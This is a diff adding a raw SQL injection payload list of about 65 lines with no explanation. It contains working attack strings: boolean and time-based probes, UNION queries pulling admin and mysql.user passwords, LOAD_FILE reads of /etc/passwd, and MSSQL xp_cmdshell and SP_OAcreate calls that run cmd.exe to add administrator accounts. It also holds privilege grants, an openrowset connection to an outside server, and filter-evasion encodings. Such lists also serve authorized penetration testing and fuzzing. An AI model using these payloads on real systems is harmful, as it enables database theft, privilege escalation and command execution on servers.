@@ -1,0 +1,67 @@
+1 and 1=1
+1 or 'ab'='ab
+1 and ord(mid(version(),1,1))>51/*
+1 order by 10--
+1 ;select BENCHMARK(100000,SHA1('true')), false);--
+1 having 1=1
+1 GROUP BY colume_got having 1=1
+1 ;create table cmd(a text)
+1 "UNION%20%28SELECT%201,username,3,4,passwd,6,7,8,9,10,11,12,13,14,15,16,17,18%20from%28admin%29%29
+1 =-9%0Aunion%0Aselect 1,2,3,4"
+1 null union all select 1,user(),3,4,5/*
+1 ;insert into user(username,password) values('xxxx',' xxxx'),('dddd','dddd')/* ');
+1 
+1 and 1=(Select IS_MEMBER('db_owner'))
+1 And char(124)%2BCast(IS_MEMBER('db_owner') as varchar(1))%2Bchar(124)=1 ;--
+1 and 1= (Select HAS_DBACCESS('master'))
+1 And char(124)%2BCast(HAS_DBACCESS('master') as varchar(1))%2Bchar(124)=1 --
+1 and char(124)%2Buser%2Bchar(124)=0
+1 and user>0
+1 and 1=(select IS_SRVROLEMEMBER('sysadmin'));--
+1 And char(124)%2BCast(IS_SRVROLEMEMBER(0x730079007300610064006D0069006E00) as varchar(1))%2Bchar(124)=1 --
+1 and exists (select * from sysobjects);--
+1 ;declare @d int;--
+1 ;exec master..dbo.sp_addextendedproc 'xp_cmdshell','xplog70.dll';--
+1 select * from openrowset('sqloledb','server=192.168.1.200,1433;uid=test;pwd=pafpaf','select @@version')
+1 exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
+1 select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\winnt\system32\ias\ias.mdb','select  shell 
+1 ("cmd.exe /c net user admin admin1234 /add")')
+1 ";DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, 'C:
+1 \WINNT\system32\cmd.exe /c net user paf pafpaf /add';--"
+1 EXEC [master].[dbo].[xp_cmdshell] 'cmd /c md c:\1111'
+1 and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype = 'X' AND name = 'xp_cmdshell') 
+1 exec master..xp_dirtree 'c:\winnt\system32\',1,1
+1 And (Select char(124)%2BCast(Count(1) as varchar(8000))%2Bchar(124) From D99_Tmp)=0 ;--
+1 exec master.dbo.sp_addsrvrolemember test,sysadmin
+1 GRANT exec On xp_proxiedadata TO public
+1 Create TABLE biao(id int NULL,name nvarchar(256) null);
+1 select name from master.dbo.sysdatabases
+1 SELECT version FROM v$instance;
+1 SELECT @@version
+1 SELECT /*comment*/1
+1 SELECT user_name();
+1 SELECT system_user;
+1 SELECT DB_NAME() 
+1 SELECT char(0x41)
+1 IF (1=1) SELECT 1 ELSE SELECT 2
+1 SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END
+1 WAITFOR DELAY '0:0:5'
+1 declare @host varchar(800); 
+1 SELECT HOST_NAME() 
+1  UNION ALL SELECT LOAD_FILE('/etc/passwd')
+1 GRANT ALL PRIVILEGES ON *.* TO test1@'%';
+1 SELECT @@datadir; 
+1 SELECT cast('1' AS unsigned integer);
+1 or 2=2%2D%2D
+1 /**/and/**/1=1
+1 %20a%%%nd%201=1
+1 %0aand%0a1=1
+1 a%n%d 1=1
+1 %01and%011=1
+1 and (se%%lect top 1 password from [admin])=0
+1 /*!union*/ /*!select*/  user,password /*!from*/ mysql.user
+1 /**/union/**/select/**/1,load_file(0x633A5C626F6F742E696E69),3/*
+1 ?id=1 un%u0069on sel%u0065ct pass f%u0072om admin li%u006dit 1
+1 %61nd 1=1
+1 &id=union&id=select&id=1,2&id=from%20mysql.user
+1 ?id=1 union select 1&id=pass from admin
